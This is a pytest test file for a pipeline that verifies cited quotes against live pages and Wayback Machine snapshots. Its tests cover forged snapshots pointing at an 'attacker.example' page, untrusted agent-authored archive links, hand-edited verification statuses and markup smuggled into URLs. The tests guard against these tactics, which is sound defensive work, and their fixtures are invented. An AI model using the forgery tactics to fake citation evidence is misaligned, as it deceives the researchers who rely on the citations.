    _serve(monkeypatch, lambda request: httpx.Response(
        200, content=b"%PDF-1.4 truncated", headers={"content-type": "application/pdf"}))
    page = fetch_mod.fetch(url, tmp_path)
    assert page.title is None
    assert "could not be opened" in page.error and "application/pdf" in page.error
    # Both extractors' failures: the first is often the precise one.
    assert "pdfplumber: " in page.error and "; pypdf: " in page.error

    s = verify_source(_pdf_src(url=url), tmp_path, rules=RULES)
    assert s.verification.status == "fetch_failed"
    assert "could not be opened" in s.verification.reason
    assert "empty pdf text" not in s.verification.reason


def test_a_404_at_a_pdf_url_says_404(tmp_path, monkeypatch):
    """An HTML "not found" page at a .pdf URL: the extraction failure is a symptom of the 404,
    and recording it hid the 404 too."""
    import httpx

    url = "https://example.org/missing.pdf"
    _serve(monkeypatch, lambda request: httpx.Response(
        404, html="<html><body><h1>Page not found</h1></body></html>"))
    page = fetch_mod.fetch(url, tmp_path)
    assert page.title is None and page.error is None

    s = verify_source(_pdf_src(url=url, publisher="Example Agency"), tmp_path, rules=RULES)
    assert s.verification.status == "fetch_failed"
    assert s.verification.reason.startswith("HTTP 404")


def test_the_build_notes_a_page_kept_after_the_last_verify(tmp_path, monkeypatch):
    """`vg fetch --refresh` can keep a page after the last `vg verify`, and `vg build` only
    revalidates from the cache. The green row must still say its page could not be
    re-fetched — once, however many builds run — and stop saying so once a re-fetch works."""
    import httpx

    def _good(request):
        return httpx.Response(200, html=(
            f"<html><head><title>T</title></head><body><p>{PAGE_TEXT}</p></body></html>"))

    _seed_cache(tmp_path)
    _serve(monkeypatch, _good)
    s = verify_source(src(), tmp_path, rules=RULES)
    assert s.verification.status == "verified" and s.verification.reason is None

    _serve(monkeypatch, _bot_wall)
    fetch_mod.fetch(s.url, tmp_path, refresh=True)
    revalidate_from_cache(s, tmp_path)
    revalidate_from_cache(s, tmp_path)
    assert s.verification.status == "verified"
    assert s.verification.reason.count("re-fetch failed") == 1
    assert "HTTP 403" in s.verification.reason

    _serve(monkeypatch, _good)
    fetch_mod.fetch(s.url, tmp_path, refresh=True)
    revalidate_from_cache(s, tmp_path)
    assert s.verification.reason is None, "the note goes once a re-fetch succeeds"


def test_archive_verification_notes_a_kept_snapshot(stub, tmp_path):
    from vgpipe.models import RefetchFailure
    from vgpipe.verify import verify_against_archive

    snap = "https://web.archive.org/web/2026/https://ocregister.com/x"
    stub[snap] = _page(url=snap, final_url=snap, refetch_failure=RefetchFailure(
        attempted_at=datetime.now(UTC), extractor_version=3, status=503, reason="HTTP 503"))
    stub["https://ocregister.com/x"] = _gated("https://ocregister.com/x")
    s = src(url="https://ocregister.com/x", publisher="OC Register", archive_url=snap)
    s.verification.status = "could_not_verify_paywall"
    verify_against_archive(s, tmp_path)
    assert s.verification.status == "verified_via_archive"
    assert "HTTP 503" in s.verification.reason and "kept the copy" in s.verification.reason


def test_a_concurrent_good_refetch_is_not_undone(tmp_path, monkeypatch):
    """Parallel runs share the cache. If another run re-fetches successfully while ours waits
    on a failing host, writing our stale copy back would undo its fix and mark the page failed
    under the current extractor — so it would never be retried."""
    import httpx

    from vgpipe.models import EXTRACTOR_VERSION

    good = _seed_cache(tmp_path)
    newer = _page(text=PAGE_TEXT + "\nAdded by the other run.", extractor_version=EXTRACTOR_VERSION,
                  fetched_at=datetime.now(UTC))

    def _other_run_lands_first(request):
        fetch_mod.cache_path(tmp_path, good.url).write_text(newer.model_dump_json())
        return httpx.Response(403, text="Forbidden")

    _serve(monkeypatch, _other_run_lands_first)
    page = fetch_mod.fetch(good.url, tmp_path)
    on_disk = fetch_mod.load_cached(tmp_path, good.url)
    assert page.text == newer.text and on_disk.text == newer.text
    assert on_disk.refetch_failure is None


def test_cache_writes_leave_no_partial_file(tmp_path, monkeypatch):
    """A half-written cache file reads as no page, and a re-fetch that sees no page has nothing
    to protect. Writes go through a temp file and a rename."""
    good = _seed_cache(tmp_path)
    _serve(monkeypatch, _bot_wall)
    fetch_mod.fetch(good.url, tmp_path)
    assert [p.name for p in fetch_mod.cache_dir(tmp_path).iterdir()] == [
        fetch_mod.cache_path(tmp_path, good.url).name]


def test_vg_check_says_when_a_page_was_kept(tmp_path, monkeypatch, capsys):
    """`vg check` is the researcher's self-check. On a page kept under an older extraction,
    "Not on the page. Do not cite this." alone would have them drop a real citation."""
    import re

    import typer

    from vgpipe import cli

    good = _seed_cache(tmp_path)
    _serve(monkeypatch, _bot_wall)
    with pytest.raises(typer.Exit):   # a miss is a failure, and `vg check` exits non-zero
        cli.check(good.url, "a sentence the old extraction dropped", data=tmp_path,
                  cache=tmp_path)
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())  # rich wraps
    assert "re-fetch failed (HTTP 403" in out and "older extraction" in out
    assert out.index("re-fetch failed") < out.index("snippet_not_found")


# --- archive: a snapshot counts only if the pipeline saved it and it holds the page --------

# The shape of what cal-access actually serves a non-browser client, from the page cache.
INCAPSULA = "Request unsuccessful. Incapsula incident ID: 123456789012345678-876543210987654321"
PAYWALLED = "https://ocregister.com/x"
SNAP = f"https://web.archive.org/web/2026/{PAYWALLED}"
FORGED = "https://web.archive.org/web/2026/https://attacker.example/quote"


def _paywalled(**kw):
    s = src(url=PAYWALLED, publisher="OC Register", **kw)
    s.verification.status = "could_not_verify_paywall"
    s.paywall = True
    return s


def _run_archive(tmp_path, monkeypatch, sources, saved):
    """Run `vg archive` over one claim with Save Page Now answering `saved` (url → snapshot;
    a missing url is a failed save). Returns the written sources."""
    import json

    from vgpipe import cli

    (tmp_path / "claims").mkdir(exist_ok=True)
    (tmp_path / "claims" / "q1.json").write_text(json.dumps(
        {"question_id": "q1", "question": "?", "answer": "a", "sources": sources}))

    def fake_archive_all(urls, *, delay=3.0, progress=None):
        for u in urls:
            if progress:
                progress(u, saved.get(u), None if u in saved else "SPN: blocked by the site")
        return {u: saved.get(u) for u in urls}

    monkeypatch.setattr(cli.arch, "archive_all", fake_archive_all)
    cli.archive(data=tmp_path, delay=0)
    return json.loads((tmp_path / "claims" / "q1.json").read_text())["sources"]


def test_snapshot_must_be_a_capture_of_the_cited_url():
    """The host pin says who serves a snapshot, not which page it captured. Only the scheme,
    a default port, one trailing slash, host case and the fragment fold; anything else is a
    different page."""
    from vgpipe.archive import snapshot_of

    cited = "https://ocregister.com/politics/x?id=7"
    for same in ("https://web.archive.org/web/2026/https://ocregister.com/politics/x?id=7",
                 "https://web.archive.org/web/20260101000000/http://ocregister.com/politics/x?id=7",
                 "https://web.archive.org/web/2026id_/https://OCRegister.com:443/politics/x/?id=7",
                 "http://web.archive.org/web/2026/https://ocregister.com/politics/x?id=7#top"):
        assert snapshot_of(cited, same), same
    for other in ("https://web.archive.org/web/2026/https://attacker.example/politics/x?id=7",
                  "https://web.archive.org/web/2026/https://ocregister.com/politics/y?id=7",
                  "https://web.archive.org/web/2026/https://ocregister.com/politics/x?id=8",
                  "https://web.archive.org/web/2026/https://ocregister.com/politics/x",
                  "https://web.archive.org/web/2026/https://ocregister.com:8443/politics/x?id=7",
                  # a default port only folds for its own scheme
                  "https://web.archive.org/web/2026/https://ocregister.com:80/politics/x?id=7",
                  "https://web.archive.org/web/2026/http://ocregister.com:443/politics/x?id=7",
                  "https://web.archive.org/web/2026/https://www.ocregister.com/politics/x?id=7",
                  "https://web.archive.org/web/2026/ocregister.com/politics/x?id=7",
                  "https://web.archive.org/web/*/https://ocregister.com/politics/x?id=7",
                  "https://web.archive.org/web/2026/"):
        assert not snapshot_of(cited, other), other

    # a redirect the pipeline itself observed on the live fetch is still the cited page
    www = "https://web.archive.org/web/2026/https://www.ocregister.com/politics/x?id=7"
    assert snapshot_of(cited, www, also=("https://www.ocregister.com/politics/x?id=7",))
    # and a citation that is itself a snapshot points at that snapshot's target
    assert snapshot_of("https://web.archive.org/web/2023/https://ocregister.com/politics/x?id=7",
                       www.replace("www.", ""))


def test_snapshot_of_a_different_url_never_verifies(stub, tmp_path):
    """Anyone can Save Page Now a page holding their own quote. A snapshot of some
    other URL must never earn verified_via_archive, and a claimed one must not survive build."""
    from vgpipe.verify import verify_against_archive

    stub[FORGED] = _page(url=FORGED)          # the attacker's page carries the snippet
    stub[PAYWALLED] = _gated(PAYWALLED)
    s = _paywalled(archive_url=FORGED)
    assert verify_against_archive(s, tmp_path).verification.status == "could_not_verify_paywall"

    forged = _paywalled(archive_url=FORGED)
    forged.verification.status = "verified_via_archive"
    out = revalidate_from_cache(forged, tmp_path)
    assert out.verification.status == "human_review"
    assert "not a capture of the cited URL" in out.verification.reason


def test_only_a_served_real_page_can_verify_via_archive(stub, tmp_path, monkeypatch):
    """An error page or a bot check can echo the snippet. Neither is the article."""
    from vgpipe.verify import verify_against_archive

    quote = "Blocked: she opposed the Harbor Levy Act"
    for junk in (_page(url=SNAP, status=404, text=quote),
                 _page(url=SNAP, status=503, text=quote),
                 _page(url=SNAP, title="Just a moment...", text=quote)):
        stub[SNAP] = junk
        out = verify_against_archive(_paywalled(archive_url=SNAP), tmp_path)
        assert out.verification.status == "could_not_verify_paywall", junk


def test_archive_rechecks_a_row_verified_against_an_earlier_snapshot(stub, tmp_path,
                                                                     monkeypatch, capsys):
    """verified_via_archive was earned against the snapshot recorded then. When `vg archive`
    replaces it with one that no longer holds the quote, the status must not ride along."""
    import re

    stub[SNAP] = _page(url=SNAP, text="Subscribe to continue reading. Already a subscriber?")
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "verification": {"status": "verified_via_archive", "context": "an old excerpt",
                         "context_offset": [0, 3], "matched_offset": 7,
                         "support": "supports", "support_note": "about the old excerpt"}}],
        saved={PAYWALLED: SNAP})
    v = out["verification"]
    assert v["status"] == "could_not_verify_paywall"
    assert v["context"] is None and v["matched_offset"] is None, "no excerpt from a snapshot it lost"
    assert v["support"] == "unreviewed", "nor a verdict about that excerpt"
    said = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "no longer confirms the snippet" in said and "snippet confirmed" not in said

    # and one whose snapshot still holds the quote simply re-earns it
    stub[SNAP] = _page(url=SNAP)
    stub[PAYWALLED] = _gated(PAYWALLED)
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "verification": {"status": "verified_via_archive"}}], saved={PAYWALLED: SNAP})
    assert out["verification"]["status"] == "verified_via_archive"


def test_agent_authored_archive_url_is_discarded_when_the_save_fails(stub, tmp_path, monkeypatch):
    """cal-access always fails Save Page Now, and `vg archive` used to keep whatever
    archive_url the claim file carried — then verify the paywalled quote against it."""
    fetched: list[str] = []

    def tracking_fetch(url, root, *, refresh=False, timeout=30.0):
        fetched.append(url)
        return stub.get(url, _page(url=url, status=404, text="", error="not found"))

    monkeypatch.setattr("vgpipe.verify.fetch", tracking_fetch)
    stub[FORGED] = _page(url=FORGED)
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "archive_url": FORGED, "verification": {"status": "could_not_verify_paywall"}}],
        saved={})

    assert out["archive_url"] is None, "the agent's snapshot must be discarded, not kept"
    assert out["archive_status"] == "archive_failed"
    assert out["verification"]["status"] == "could_not_verify_paywall"
    assert FORGED not in fetched, "and never fetched as evidence"


def test_bot_check_snapshot_is_unusable(stub, tmp_path, monkeypatch):
    """SPN reported success on a cal-access page and captured the bot check. A junk
    snapshot is worse than none on a row whose live page can't be read — it looks like
    evidence — so it is badged, named, and not offered as a link."""
    from vgpipe.verify import bot_check

    url = "https://cal-access.sos.ca.gov/PDFGen/pdfgen.prg?filingid=9990013&amendid=0"
    snap = f"https://web.archive.org/web/20260814093512/{url}"
    source = {"url": url, "publisher": "CA Secretary of State", "author": "SOS",
              "date": "2026-03-01", "source_type": "official_record",
              "snippet": "KO FOR CONTROLLER 2026"}
    stub[url] = _page(url=url, title=None, text=INCAPSULA)
    stub[snap] = _page(url=snap, title=None, text=INCAPSULA)
    [out] = _run_archive(tmp_path, monkeypatch, [source], saved={url: snap})
    assert out["archive_status"] == "archive_unusable"
    assert "Incapsula" in out["archive_note"]
    assert out["archive_url"] is None

    # the real junk capture in the cache was subtler: HTTP 200 and no text at all
    stub[snap] = _page(url=snap, title=None, text="")
    [out] = _run_archive(tmp_path, monkeypatch, [source], saved={url: snap})
    assert out["archive_status"] == "archive_unusable"
    assert "no readable text" in out["archive_note"]

    assert bot_check(_page(title="Just a moment...",
                           text="Enable JavaScript and cookies to continue")) == (
        "a Cloudflare challenge")
    # an article that merely mentions the phrase is not a challenge page, title included
    article = "Readers saw 'Just a moment...' before the site loaded. " + "Filler. " * 500
    assert bot_check(_page(title="How bot checks work", text=article)) is None
    assert bot_check(_page(title="Just a moment... with Controller Ko", text=article)) is None


def test_good_snapshot_is_archived(stub, tmp_path, monkeypatch):
    from vgpipe.archive import load_records

    stub[SNAP] = _page(url=SNAP)
    stub[PAYWALLED] = _gated(PAYWALLED)
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "verification": {"status": "could_not_verify_paywall"}}], saved={PAYWALLED: SNAP})
    assert out["archive_status"] == "archived"
    assert out["archive_url"] == SNAP
    assert out["verification"]["status"] == "verified_via_archive"
    # recorded where the next command looks, not only in the claim file
    assert load_records(tmp_path)[PAYWALLED]["snapshot"] == SNAP


def test_snapshot_the_wayback_machine_would_not_serve_is_unchecked_not_junk(stub, tmp_path):
    """A timeout or a 503 from the Wayback Machine says nothing about what the capture holds.
    Calling it unusable would hide a possibly good link for a reason that isn't about it."""
    from vgpipe.verify import apply_archive

    records = {PAYWALLED: {"snapshot": SNAP, "error": None}}
    for down in (_page(url=SNAP, status=0, text="", error="ConnectTimeout: timed out"),
                 _page(url=SNAP, status=503, text="Service Unavailable")):
        stub[SNAP] = down
        out = apply_archive(src(url=PAYWALLED), records, tmp_path)
        assert out.archive_status == "archive_unconfirmed", down.status
        assert out.archive_url == SNAP

    # nor does a 404: a fresh capture can 404 until the Wayback Machine indexes it
    stub[SNAP] = _page(url=SNAP, status=404, text="Not found")
    assert apply_archive(src(url=PAYWALLED), records, tmp_path).archive_status == (
        "archive_unconfirmed")

    # but a capture that loads and holds nothing is evidence: the real cal-access junk
    stub[SNAP] = _page(url=SNAP, status=200, text="")
    assert apply_archive(src(url=PAYWALLED), records, tmp_path).archive_status == (
        "archive_unusable")


def test_paywalled_row_whose_snapshot_lacks_the_snippet_stays_unverified(stub, tmp_path,
                                                                          monkeypatch):
    """The capture holds the paywall stub, not the article."""
    stub[SNAP] = _page(url=SNAP, text="Subscribe to continue reading. Already a subscriber?")
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "verification": {"status": "could_not_verify_paywall"}}], saved={PAYWALLED: SNAP})
    assert out["verification"]["status"] == "could_not_verify_paywall"
    assert out["archive_status"] == "archive_unusable"
    assert "snippet is not in" in out["archive_note"]
    assert out["archive_url"] is None


def test_query_citation_snapshot_is_compared_with_the_live_page(stub, tmp_path):
    """A query citation's snippet describes the lookup and need not be on the page, so its
    snapshot is compared with the page the pipeline fetched live."""
    from vgpipe.models import QueryCitation
    from vgpipe.verify import apply_archive

    url = "https://cal-access.sos.ca.gov/Campaign/Committees/Detail.aspx?id=9990001"
    snap = f"https://web.archive.org/web/2026/{url}"
    records = {url: {"snapshot": snap, "error": None}}
    q = QueryCitation(name="contributor_total", params={"filer_id": "9990001"}, expected="1")

    def run(live, snapshot):
        stub[url], stub[snap] = live, snapshot
        s = src(url=url, source_type="official_record", query=q, snippet="lookup of totals")
        return apply_archive(s, records, tmp_path)

    committee = _page(title="California Secretary of State - CalAccess - Campaign Finance",
                      text="Campaign Finance: KO FOR CONTROLLER 2026; DANA\n"
                           "Election Cycle: 2025 through 2026 Historical Information\n"
                           "View Information: (Due to the amount of data, the totals below)")
    assert run(committee, committee).archive_status == "archived"

    # one shared line is as likely a footer as content: too little to vouch either way
    footer = "Copyright © 2026 California Secretary of State. All rights reserved."
    out = run(_page(title=committee.title, text=footer), _page(text=f"{footer}\nother"))
    assert out.archive_status == "archive_unconfirmed"

    out = run(committee, _page(title="Rants & Raves for the Week of June 7",
                               text=PAGE_TEXT + "Another long line of an unrelated page here."))
    assert out.archive_status == "archive_unusable" and out.archive_url is None

    # the live page is a bot check: nothing to compare with, so offered but not vouched for
    out = run(_page(title=None, text=INCAPSULA), committee)
    assert out.archive_status == "archive_unconfirmed"
    assert out.archive_url == snap

    # cal-access gives every page one title, so a title match proves nothing
    same_title_other_page = _page(title=committee.title,
                                  text="Campaign Finance: SOME OTHER COMMITTEE 2018; SOMEONE")
    assert run(committee, same_title_other_page).archive_status == "archive_unusable"

    # an older capture standing in for a failed save can share the page furniture and still
    # hold another cycle: without a snippet to find, it is not vouched for
    records[url]["error"] = "SPN: blocked by the site; using an earlier capture"
    out = run(committee, committee)
    assert out.archive_status == "archive_unconfirmed"
    assert "not a fresh capture" in out.archive_note and "older capture" in out.archive_note


def test_an_earlier_capture_is_never_recorded_as_a_fresh_save(monkeypatch):
    """save() falls back to the closest existing capture when the save fails; that must stay
    visible, or a stale capture reads as the fresh snapshot CLAUDE.md insists on."""
    from vgpipe import archive as arch

    old = "https://web.archive.org/web/2019/https://ocregister.com/x"

    def refuse(*a, **k):
        raise arch.httpx.ConnectError("refused")

    monkeypatch.setattr(arch.httpx, "get", refuse)
    monkeypatch.setattr(arch.httpx, "post", refuse)
    monkeypatch.setattr(arch, "auth_header", lambda: {})
    monkeypatch.setattr(arch, "existing_snapshot", lambda url: old)
    snap, err = arch.save(PAYWALLED)
    assert snap == old
    assert err and "earlier capture" in err


def test_vg_archive_survives_damage_and_interruption(stub, tmp_path, monkeypatch):
    """The records file is rebuilt by `vg archive`, so a damaged one must not stop it; and a
    run interrupted partway keeps what it already saved."""
    import json

    from vgpipe import archive as arch
    from vgpipe import cli

    (tmp_path / "archives.json").write_text("{not json")
    stub[SNAP] = _page(url=SNAP)
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act"}],
        saved={PAYWALLED: SNAP})
    assert out["archive_status"] == "archived"
    assert list(tmp_path.glob("archives.json.damaged-*")), "the damaged file is kept, set aside"

    # every other command refuses loudly rather than reading damage as "nothing archived"
    for damage in (b"[]", b'{"https://x.example/": "not a record"}', b"\xff\xfe{"):
        (tmp_path / "archives.json").write_bytes(damage)
        with pytest.raises(ValueError, match="sets it aside"):
            arch.load_records(tmp_path)
        with pytest.raises(cli.typer.Exit):
            cli.build(data=tmp_path, title="t")

    (tmp_path / "archives.json").unlink()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a", "sources": [
            {"url": u, "publisher": p, "author": "R", "source_type": "bylined_journalism",
             "snippet": "she opposed the measure"}
            for u, p in ((PAYWALLED, "OC Register"), ("https://sacbee.com/b", "Sac Bee"))]}))

    def interrupted(urls, *, delay=3.0, progress=None):
        progress(urls[0], SNAP, None)
        raise KeyboardInterrupt

    monkeypatch.setattr(cli.arch, "archive_all", interrupted)
    with pytest.raises(KeyboardInterrupt):
        cli.archive(data=tmp_path, delay=0)
    assert arch.load_records(tmp_path)[PAYWALLED]["snapshot"] == SNAP


def test_a_cached_wayback_failure_is_retried_not_final(stub, tmp_path, monkeypatch):
    """fetch() caches whatever came back. A timeout cached for a snapshot must not decide it
    for good: when a save fails, `vg archive` keeps the earlier snapshot and checks it again."""
    from vgpipe.verify import apply_archive

    calls: list[bool] = []
    good = _page(url=SNAP)

    def fetch(url, root, *, refresh=False, timeout=30.0):
        calls.append(refresh)
        return good

    monkeypatch.setattr("vgpipe.verify.fetch", fetch)
    stub[SNAP] = _page(url=SNAP, status=0, text="", error="ReadTimeout")   # what the cache holds
    out = apply_archive(src(url=PAYWALLED), {PAYWALLED: {"snapshot": SNAP}}, tmp_path,
                        fetch_missing=True)
    assert calls == [True], "the cached failure is re-fetched"
    assert out.archive_status == "archived"


def test_verify_rerun_keeps_an_archive_verification(stub, tmp_path):
    """verify_source resets a paywalled row; with its snapshot cached, `vg verify` re-earns
    verified_via_archive rather than dropping it until the next (slow) `vg archive`."""
    import json

    from vgpipe import archive as arch
    from vgpipe import cli

    stub[PAYWALLED] = _page(url=PAYWALLED, status=403, text="", paywall_suspected=True)
    stub[SNAP] = _page(url=SNAP)
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a", "sources": [
            {"url": PAYWALLED, "publisher": "OC Register", "author": "R",
             "source_type": "bylined_journalism",
             "snippet": "she opposed the Harbor Levy Act"}]}))
    arch.save_records(tmp_path, {PAYWALLED: {"snapshot": SNAP, "error": None}})

    cli.verify(data=tmp_path)
    [out] = json.loads((tmp_path / "claims" / "q1.json").read_text())["sources"]
    assert out["verification"]["status"] == "verified_via_archive"


def test_review_app_badges_an_unusable_snapshot_and_hides_an_unrecorded_one(tmp_path,
                                                                           monkeypatch, capsys):
    """The badge is the point of the check; and `vg build` must not render an archive link
    the pipeline never recorded, whatever the claim file says."""
    import json

    from vgpipe import archive as arch
    from vgpipe import cli

    pages = {SNAP: _page(url=SNAP, title=None, text=INCAPSULA)}
    monkeypatch.setattr("vgpipe.verify.load_cached", lambda root, url: pages.get(url))
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a",
        "sources": [
            {"url": PAYWALLED, "publisher": "OC Register", "author": "R",
             "source_type": "bylined_journalism", "snippet": "she opposed the measure"},
            {"url": "https://sacbee.com/b", "publisher": "Sacramento Bee", "author": "R",
             "source_type": "bylined_journalism", "snippet": "she opposed the measure",
             "archive_url": FORGED}]}))
    arch.save_records(tmp_path, {PAYWALLED: {"snapshot": SNAP, "error": None}})

    cli.build(data=tmp_path, title="t")
    import re

    said = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "1 source(s) carry an archive_url no `vg archive` run recorded" in said, (
        "dropping it is said out loud")
    html = (tmp_path / "out" / "review.html").read_text()
    assert "snapshot unusable" in html and "Incapsula" in html
    assert SNAP in html, "the note names the rejected snapshot so a human can look"
    assert f'href="{SNAP}"' not in html, "but it is not offered as the archive link"
    assert FORGED not in html, "an archive_url the pipeline never recorded is not rendered"


def test_no_command_reads_an_archive_field_from_a_claim_file(tmp_path):
    """Even a trusted load: the run's records are the only authority for a snapshot, so a
    command that forgot apply_archive() shows none rather than the file's."""
    import json

    from vgpipe.cli import load_claims

    (tmp_path / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a", "sources": [{
            "url": PAYWALLED, "publisher": "P", "author": "A",
            "source_type": "bylined_journalism", "snippet": "she opposed the measure",
            "archive_url": FORGED, "archive_status": "archived", "archive_note": "fine",
            "verification": {"status": "could_not_verify_paywall"}}]}))
    for trust in (False, True):
        [s] = load_claims(tmp_path, trust_machine_fields=trust)[0].sources
        assert (s.archive_url, s.archive_status, s.archive_note) == (None, None, None), trust
    [s] = load_claims(tmp_path, trust_machine_fields=True)[0].sources
    assert s.verification.status == "could_not_verify_paywall", "trust still keeps the rest"


def test_verify_says_when_it_drops_unrecorded_snapshots(stub, tmp_path, capsys):
    """A run archived before the records existed carries its snapshots only in the claim
    files. The first command to write them back drops them, so it has to say so."""
    import json
    import re

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(json.dumps({
        "question_id": "q1", "question": "?", "answer": "a", "sources": [{
            "url": PAYWALLED, "publisher": "P", "author": "A",
            "source_type": "bylined_journalism", "snippet": "she opposed the measure",
            "archive_url": SNAP}]}))
    cli.verify(data=tmp_path)
    said = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "1 source(s) carry an archive_url no `vg archive` run recorded" in said


def test_archive_output_survives_markup_in_a_cited_url(stub, tmp_path, monkeypatch):
    """Cited URLs, publishers and notes are agent-authored, and Rich reads [..] as markup: a
    URL holding `[/b]` crashed `vg archive` after the records were saved but before any claim
    file got its results."""
    url = "https://x.example/a[/b]"
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": url, "publisher": "[bold]P[/]", "author": "A",
        "source_type": "bylined_journalism", "snippet": "she opposed the measure"}], saved={})
    assert out["archive_status"] == "archive_failed"


# A readable live page the snippet has since been removed from.
REMOVED = "Deputy Controller Dana Ko spoke Tuesday about the state budget and other matters."


def test_verified_via_archive_needs_a_live_page_that_is_actually_gated(stub, tmp_path):
    """verified_via_archive means the LIVE page couldn't be read. Where it reads fine and no
    longer holds the quote, an earlier faithful capture still does: a status hand-edited to
    verified_via_archive then reproduced against the snapshot and rendered green, 'paywall'
    and all, over a citation the live page contradicts."""
    stub[PAYWALLED] = _page(url=PAYWALLED, text=REMOVED)
    stub[SNAP] = _page(url=SNAP)                     # the earlier capture holds the snippet
    forged = src(url=PAYWALLED, publisher="OC Register", archive_url=SNAP)
    forged.verification.status = "verified_via_archive"
    out = revalidate_from_cache(forged, tmp_path, rules=RULES)
    assert out.verification.status == "human_review"
    assert "not gated" in out.verification.reason

    # the honest case still stands: the live page really is gated
    stub[PAYWALLED] = _page(url=PAYWALLED, status=403, text="", paywall_suspected=True)
    honest = src(url=PAYWALLED, publisher="OC Register", archive_url=SNAP)
    honest.verification.status = "verified_via_archive"
    assert revalidate_from_cache(honest, tmp_path, rules=RULES).verification.status == (
        "verified_via_archive")


def test_archive_does_not_upgrade_a_paywall_status_the_live_page_contradicts(stub, tmp_path,
                                                                             monkeypatch):
    """`vg archive` loads trusted, so a could_not_verify_paywall written into the claim file
    reached verify_against_archive, which upgraded it from the snapshot without asking
    whether the live page is gated at all."""
    stub[PAYWALLED] = _page(url=PAYWALLED, text=REMOVED)
    stub[SNAP] = _page(url=SNAP)
    [out] = _run_archive(tmp_path, monkeypatch, [{
        "url": PAYWALLED, "publisher": "OC Register", "author": "R",
        "source_type": "bylined_journalism", "snippet": "she opposed the Harbor Levy Act",
        "verification": {"status": "could_not_verify_paywall"}}], saved={PAYWALLED: SNAP})
    assert out["verification"]["status"] != "verified_via_archive"


def test_a_failed_save_keeps_our_snapshot_over_the_fallback_capture(stub, tmp_path,
                                                                     monkeypatch):
    """When SPN fails, save() hands back the closest existing capture. Nothing has checked
    it, and it can be another URL's (a www. variant, which the target check refuses), so it
    must not replace a snapshot the pipeline saved and checked itself."""
    from vgpipe import archive as arch

    www = "https://web.archive.org/web/2027/https://www.ocregister.com/x"
    stub[SNAP] = _page(url=SNAP)
    stub[PAYWALLED] = _gated(PAYWALLED)
    arch.save_records(tmp_path, {PAYWALLED: {"snapshot": SNAP, "error": None}})

    from vgpipe import cli

    def fallback(urls, *, delay=3.0, progress=None):
        for u in urls:
            progress(u, www, "SPN: blocked by the site; using an earlier capture")
        return {u: www for u in urls}

    monkeypatch.setattr(cli.arch, "archive_all", fallback)
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a",
        sources=[_paywalled(snippet="she opposed the Harbor Levy Act")]).model_dump_json())
    cli.archive(data=tmp_path, delay=0)
    assert arch.load_records(tmp_path)[PAYWALLED]["snapshot"] == SNAP
    import json

    [out] = json.loads((tmp_path / "claims" / "q1.json").read_text())["sources"]
    assert out["archive_url"] == SNAP and out["archive_status"] == "archived"

    # with nothing of our own to keep, the fallback is recorded — and marked as one
    arch.save_records(tmp_path, {})
    cli.archive(data=tmp_path, delay=0)
    rec = arch.load_records(tmp_path)[PAYWALLED]
    assert rec["snapshot"] == www and "earlier capture" in rec["error"]


def test_a_failed_save_replaces_our_snapshot_once_it_is_known_junk(stub, tmp_path, monkeypatch):
    """Keeping our own earlier snapshot over the fallback capture is right while ours is good.
    Where Save Page Now always fails (cal-access), it also kept a bot-check capture forever: the
    fallback, possibly a good capture, was never even checked. Ours is kept only while it is not
    known junk — and still kept when there is no fallback, so its badge and note survive."""
    import json

    from vgpipe import archive as arch
    from vgpipe import cli

    older = f"https://web.archive.org/web/2019/{PAYWALLED}"
    stub[SNAP] = _page(url=SNAP, title=None, text=INCAPSULA)   # what SPN captured last time
    stub[older] = _page(url=older)                              # a capture holding the article
    stub[PAYWALLED] = _gated(PAYWALLED)
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(Claim(
        question_id="q1", question="?", answer="a",
        sources=[_paywalled(snippet="she opposed the Harbor Levy Act")]).model_dump_json())

    def fails(fallback):
        def archive_all(urls, *, delay=3.0, progress=None):
            for u in urls:
                progress(u, fallback, "SPN: blocked by the site"
                         + ("; using an earlier capture" if fallback else ""))
        return archive_all

    arch.save_records(tmp_path, {PAYWALLED: {"snapshot": SNAP, "error": None}})
    monkeypatch.setattr(cli.arch, "archive_all", fails(None))
    cli.archive(data=tmp_path, delay=0)
    assert arch.load_records(tmp_path)[PAYWALLED]["snapshot"] == SNAP, "nothing to try instead"

    monkeypatch.setattr(cli.arch, "archive_all", fails(older))
    cli.archive(data=tmp_path, delay=0)
    rec = arch.load_records(tmp_path)[PAYWALLED]
    assert rec["snapshot"] == older and "earlier capture" in rec["error"]
